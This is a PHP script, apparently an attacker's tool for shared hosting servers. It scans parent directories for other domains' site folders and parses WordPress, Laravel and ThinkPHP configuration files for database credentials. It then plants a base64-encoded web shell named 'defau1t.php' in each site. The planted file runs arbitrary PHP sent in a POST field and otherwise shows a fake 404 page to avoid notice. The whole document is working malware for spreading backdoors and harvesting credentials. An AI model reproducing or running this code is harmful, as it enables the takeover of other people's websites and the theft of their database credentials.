<?php
error_reporting(0);
set_time_limit(0);

$START_DIR = realpath(__DIR__);
$MAX_DEPTH = 5;

/* -------------------- helpers -------------------- */

function looksLikeDomain(string $name): bool {
    return (bool)preg_match('/^[a-z0-9][a-z0-9\-\.]+\.[a-z]{2,24}$/i', $name);
}

function findDomainDirs(string $start, int $maxDepth): array {
    $found = [];
    $seen = [];

    $dir = $start;
    for ($i = 0; $i < $maxDepth; $i++) {
        if (!$dir || isset($seen[$dir])) break;
        $seen[$dir] = true;

        $list = @scandir($dir);
        if ($list) {
            foreach ($list as $d) {
                if ($d === '.' || $d === '..') continue;
                if (in_array(strtolower($d), ['www','html','public','public_html','logs','tmp'])) continue;

                $full = $dir . DIRECTORY_SEPARATOR . $d;
                if (is_dir($full) && looksLikeDomain($d)) {
                    $found[$d] = realpath($full);
                }
            }
        }

        $dir = dirname($dir);
    }

    return $found;
}

function detectDomainFromPath(string $path): ?string {
    foreach (explode(DIRECTORY_SEPARATOR, $path) as $p) {
        if (looksLikeDomain($p)) {
            return strtolower($p);
        }
    }
    return null;
}

/* -------------------- wordpress -------------------- */

function parseWpConfig(string $file): ?array {
    if (!is_file($file) || !is_readable($file)) return null;

    $c = file_get_contents($file);
    if ($c === false) return null;

    $out = [];

    foreach (['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST'] as $k) {
        if (preg_match("/define\s*\(\s*['\"]{$k}['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $c, $m)) {
            $out[$k] = $m[1];
        }
    }

    if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]\s*;/", $c, $m)) {
        $out['TABLE_PREFIX'] = $m[1];
    } else {
        $out['TABLE_PREFIX'] = 'wp_';
    }

    foreach (['WP_HOME','WP_SITEURL'] as $k) {
        if (preg_match("/define\s*\(\s*['\"]{$k}['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $c, $m)) {
            $out[$k] = $m[1];
        }
    }

    return $out ?: null;
}

function wpSiteFromDb(array $cfg): ?array {
    if (empty($cfg['DB_NAME']) || empty($cfg['DB_USER']) || empty($cfg['DB_HOST'])) {
        return null;
    }

    $mysqli = @new mysqli(
        $cfg['DB_HOST'],
        $cfg['DB_USER'],
        $cfg['DB_PASSWORD'] ?? '',
        $cfg['DB_NAME']
    );

    if ($mysqli->connect_errno) return null;

    $table = ($cfg['TABLE_PREFIX'] ?? 'wp_') . 'options';
    $sql = "SELECT option_name, option_value FROM `$table` WHERE option_name IN ('siteurl','home')";
    $res = $mysqli->query($sql);
    if (!$res) return null;

    $out = [];
    while ($row = $res->fetch_assoc()) {
        $out[$row['option_name']] = $row['option_value'];
    }

    return $out ?: null;
}

/* -------------------- laravel -------------------- */

function parseEnv(string $file): ?array {
    if (!is_file($file) || !is_readable($file)) return null;

    $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$lines) return null;

    $out = [];
    foreach ($lines as $line) {
        if ($line[0] === '#') continue;
        if (!str_contains($line, '=')) continue;

        [$k, $v] = explode('=', $line, 2);
        $out[trim($k)] = trim($v, " \t\n\r\0\x0B\"'");
    }

    return $out ?: null;
}

/* -------------------- thinkphp -------------------- */

function parseThinkDb(string $file): ?array {
    if (!is_file($file) || !is_readable($file)) return null;

    $c = file_get_contents($file);
    if ($c === false) return null;

    $out = [];
    foreach (['database','username','password','hostname'] as $k) {
        if (preg_match('/[\'"]'.$k.'[\'"]\s*=>\s*[\'"]([^\'"]+)[\'"]/', $c, $m)) {
            $out[$k] = $m[1];
        }
    }

    if (!empty($out['database'])) {
        return [
            'DB_NAME' => $out['database'],
            'DB_USER' => $out['username'] ?? null,
            'DB_PASSWORD' => $out['password'] ?? null,
            'DB_HOST' => $out['hostname'] ?? null,
        ];
    }

    return null;
}

/* -------------------- detect site -------------------- */

function detectSite(string $path): array {
    $info = [
        'type' => 'unknown',
        'domain' => null,
        'db' => null,
    ];

    /* WordPress */
    if (is_file($path.'/wp-config.php')) {
        $wp = parseWpConfig($path.'/wp-config.php');
        if ($wp) {
            $info['type'] = 'wordpress';
            $info['db'] = $wp;

            if (!empty($wp['WP_HOME'])) {
                $info['domain'] = parse_url($wp['WP_HOME'], PHP_URL_HOST);
            } elseif (!empty($wp['WP_SITEURL'])) {
                $info['domain'] = parse_url($wp['WP_SITEURL'], PHP_URL_HOST);
            } else {
                $dbSite = wpSiteFromDb($wp);
                if (!empty($dbSite['siteurl'])) {
                    $info['domain'] = parse_url($dbSite['siteurl'], PHP_URL_HOST);
                } elseif (!empty($dbSite['home'])) {
                    $info['domain'] = parse_url($dbSite['home'], PHP_URL_HOST);
                }
            }
        }
        return $info;
    }

    /* Laravel */
    if (is_file($path.'/.env')) {
        $env = parseEnv($path.'/.env');
        if ($env) {
            $info['type'] = 'laravel';
            $info['db'] = [
                'DB_NAME' => $env['DB_DATABASE'] ?? null,
                'DB_USER' => $env['DB_USERNAME'] ?? null,
                'DB_PASSWORD' => $env['DB_PASSWORD'] ?? null,
                'DB_HOST' => $env['DB_HOST'] ?? null,
            ];
            if (!empty($env['APP_URL'])) {
                $info['domain'] = parse_url($env['APP_URL'], PHP_URL_HOST);
            }
        }
        return $info;
    }

    /* ThinkPHP */
    if (is_file($path.'/config/database.php')) {
        $tp = parseThinkDb($path.'/config/database.php');
        if ($tp) {
            $info['type'] = 'thinkphp';
            $info['db'] = $tp;
        }
        return $info;
    }

    return $info;
}

function doUpload($path)
{
    touch($path."/defau1t.php");
    system('touch '.$path.'/defau1t.php');
    file_put_contents($path."/defau1t.php",base64_decode("PD9waHANCmlmKGlzc2V0KCRfUE9TVFsnZnRwJ10pKXsNCiAgICBpZihmaWxlX2V4aXN0cygiaW1hZ2VfeHZwYXNzZC5qcGciKSl7DQogICAgICAgIHVubGluaygiaW1hZ2VfeHZwYXNzZC5qcGciKTsNCiAgICB9DQogICAgZmlsZV9wdXRfY29udGVudHMoImltYWdlX3h2cGFzc2QuanBnIixiYXNlNjRfZGVjb2RlKCJQRDl3YUhBSyIpLmJhc2U2NF9kZWNvZGUoIkNuVnViR2x1YXlnaWFXMWhaMlZmZUhad1lYTnpaQzVxY0djaUtUc0siKS5oZXgyYmluKCRfUE9TVFsnZnRwJ10pKTsNCiAgICBpbmNsdWRlICJpbWFnZV94dnBhc3NkLmpwZyI7DQogICAgdW5saW5rKCJpbWFnZV94dnBhc3NkLmpwZyIpOw0KfWVsc2V7DQogICAgaHR0cF9yZXNwb25zZV9jb2RlKDQwNCk7DQogICAgaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOw0KICAgID8+DQogICAgPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCjx0aXRsZT5QYWdlIE5vdCBGb3VuZDwvdGl0bGU+DQo8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9Im5vaW5kZXgsIG5vZm9sbG93Ij4NCjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+DQo8c3R5bGU+DQpib2R5IHsNCiAgICBtYXJnaW46MDsNCiAgICBiYWNrZ3JvdW5kOiMwZjE3MmE7DQogICAgY29sb3I6I2U1ZTdlYjsNCiAgICBmb250LWZhbWlseTpzeXN0ZW0tdWksLWFwcGxlLXN5c3RlbSxCbGlua01hY1N5c3RlbUZvbnQsIlNlZ29lIFVJIixSb2JvdG8sSGVsdmV0aWNhLEFyaWFsLHNhbnMtc2VyaWY7DQp9DQoubWFpbiB7DQogICAgbWluLWhlaWdodDoxMDB2aDsNCiAgICBkaXNwbGF5OmZsZXg7DQogICAgYWxpZ24taXRlbXM6Y2VudGVyOw0KICAgIGp1c3RpZnktY29udGVudDpjZW50ZXI7DQp9DQouY2FyZCB7DQogICAgdGV4dC1hbGlnbjpjZW50ZXI7DQogICAgcGFkZGluZzo0MHB4Ow0KfQ0KLmNvZGUgew0KICAgIGZvbnQtc2l6ZTo5NnB4Ow0KICAgIGZvbnQtd2VpZ2h0OjcwMDsNCiAgICBsZXR0ZXItc3BhY2luZzoycHg7DQp9DQoubXNnIHsNCiAgICBmb250LXNpemU6MThweDsNCiAgICBvcGFjaXR5Oi44NTsNCiAgICBtYXJnaW4tdG9wOjEwcHg7DQp9DQphIHsNCiAgICBjb2xvcjojMzhiZGY4Ow0KICAgIHRleHQtZGVjb3JhdGlvbjpub25lOw0KfQ0KYTpob3ZlciB7DQogICAgdGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZTsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxkaXYgY2xhc3M9Im1haW4iPg0KICAgIDxkaXYgY2xhc3M9ImNhcmQiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJjb2RlIj40MDQ8L2Rpdj4NCiAgICAgICAgPGRpdiBjbGFzcz0ibXNnIj5QYWdlIG5vdCBmb3VuZDwvZGl2Pg0KICAgICAgICA8cD48YSBocmVmPSIvIj5HbyBiYWNrPC9hPjwvcD4NCiAgICA8L2Rpdj4NCjwvZGl2Pg0KPC9ib2R5Pg0KPC9odG1sPg0KICAgIDw/DQp9DQoNCg=="));
    system("echo 'PD9waHANCmlmKGlzc2V0KCRfUE9TVFsnZnRwJ10pKXsNCiAgICBpZihmaWxlX2V4aXN0cygiaW1hZ2VfeHZwYXNzZC5qcGciKSl7DQogICAgICAgIHVubGluaygiaW1hZ2VfeHZwYXNzZC5qcGciKTsNCiAgICB9DQogICAgZmlsZV9wdXRfY29udGVudHMoImltYWdlX3h2cGFzc2QuanBnIixiYXNlNjRfZGVjb2RlKCJQRDl3YUhBSyIpLmJhc2U2NF9kZWNvZGUoIkNuVnViR2x1YXlnaWFXMWhaMlZmZUhad1lYTnpaQzVxY0djaUtUc0siKS5oZXgyYmluKCRfUE9TVFsnZnRwJ10pKTsNCiAgICBpbmNsdWRlICJpbWFnZV94dnBhc3NkLmpwZyI7DQogICAgdW5saW5rKCJpbWFnZV94dnBhc3NkLmpwZyIpOw0KfWVsc2V7DQogICAgaHR0cF9yZXNwb25zZV9jb2RlKDQwNCk7DQogICAgaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOw0KICAgID8+DQogICAgPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCjx0aXRsZT5QYWdlIE5vdCBGb3VuZDwvdGl0bGU+DQo8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9Im5vaW5kZXgsIG5vZm9sbG93Ij4NCjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+DQo8c3R5bGU+DQpib2R5IHsNCiAgICBtYXJnaW46MDsNCiAgICBiYWNrZ3JvdW5kOiMwZjE3MmE7DQogICAgY29sb3I6I2U1ZTdlYjsNCiAgICBmb250LWZhbWlseTpzeXN0ZW0tdWksLWFwcGxlLXN5c3RlbSxCbGlua01hY1N5c3RlbUZvbnQsIlNlZ29lIFVJIixSb2JvdG8sSGVsdmV0aWNhLEFyaWFsLHNhbnMtc2VyaWY7DQp9DQoubWFpbiB7DQogICAgbWluLWhlaWdodDoxMDB2aDsNCiAgICBkaXNwbGF5OmZsZXg7DQogICAgYWxpZ24taXRlbXM6Y2VudGVyOw0KICAgIGp1c3RpZnktY29udGVudDpjZW50ZXI7DQp9DQouY2FyZCB7DQogICAgdGV4dC1hbGlnbjpjZW50ZXI7DQogICAgcGFkZGluZzo0MHB4Ow0KfQ0KLmNvZGUgew0KICAgIGZvbnQtc2l6ZTo5NnB4Ow0KICAgIGZvbnQtd2VpZ2h0OjcwMDsNCiAgICBsZXR0ZXItc3BhY2luZzoycHg7DQp9DQoubXNnIHsNCiAgICBmb250LXNpemU6MThweDsNCiAgICBvcGFjaXR5Oi44NTsNCiAgICBtYXJnaW4tdG9wOjEwcHg7DQp9DQphIHsNCiAgICBjb2xvcjojMzhiZGY4Ow0KICAgIHRleHQtZGVjb3JhdGlvbjpub25lOw0KfQ0KYTpob3ZlciB7DQogICAgdGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZTsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxkaXYgY2xhc3M9Im1haW4iPg0KICAgIDxkaXYgY2xhc3M9ImNhcmQiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJjb2RlIj40MDQ8L2Rpdj4NCiAgICAgICAgPGRpdiBjbGFzcz0ibXNnIj5QYWdlIG5vdCBmb3VuZDwvZGl2Pg0KICAgICAgICA8cD48YSBocmVmPSIvIj5HbyBiYWNrPC9hPjwvcD4NCiAgICA8L2Rpdj4NCjwvZGl2Pg0KPC9ib2R5Pg0KPC9odG1sPg0KICAgIDw/DQp9DQoNCg=='|base64 -d>".$path."/defau1t.php");
}

/* -------------------- main -------------------- */

$selfDomain = $_SERVER['HTTP_HOST'] ?? detectDomainFromPath($START_DIR);
$selfInfo   = detectSite($START_DIR);
$selfDb     = $selfInfo['db'];

$domains = findDomainDirs($START_DIR, $MAX_DEPTH);

header('Content-Type: text/plain');

foreach ($domains as $domain => $path) {
    if ($selfDomain && strtolower($domain) === strtolower($selfDomain)) continue;

    $site = detectSite($path);

    $sameDb = false;
    if ($selfDb && $site['db']) {
        $sameDb =
            $selfDb['DB_NAME'] === $site['db']['DB_NAME'] &&
            $selfDb['DB_USER'] === $site['db']['DB_USER'] &&
            $selfDb['DB_HOST'] === $site['db']['DB_HOST'];
    }

    echo $domain . " | " . $path;
    try {
        doUpload($path);
        if(is_dir($path."/public/")){
            doUpload($path."/public/");
        }
    }catch (Exception $e) {
        echo $e->getMessage();
    }
    echo " | type=" . $site['type'];
    if ($site['domain']) echo " | real=" . $site['domain'];
    if ($sameDb) echo " | SAME_DB";
    echo PHP_EOL;
}
